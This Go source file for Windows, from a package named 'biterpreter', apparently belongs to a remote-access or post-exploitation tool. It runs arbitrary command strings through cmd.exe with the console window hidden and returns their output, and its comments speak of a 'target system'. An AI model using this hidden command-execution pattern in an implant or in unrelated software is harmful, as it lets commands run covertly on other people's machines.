// +build windows


package biterpreter

import (
	
	"os/exec"	// requirement to execute commands against target system
	"syscall"	// required to interact with windows OS calls
	"bytes"
)

/*
Description: Exec --> Windows
Flow:
A.Spawn a cmd process, and interprete the provided string
B.Set the spawn as HideWindow, so the cmd box doesn't appear when spawning cmd
*/
func Exec(commands string) (bool,string){
	
	var outbuf,errbuf bytes.Buffer
	cmd_path := "C:\\Windows\\System32\\cmd.exe"
	cmd := exec.Command(cmd_path, "/c", commands+"\n")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdout = &outbuf
	cmd.Stderr = &errbuf
	cmd.Run()
	cmd.Wait()
	if errbuf.String() != ""{
		return true,errbuf.String()+outbuf.String()
	}

	return false,outbuf.String()+errbuf.String()
}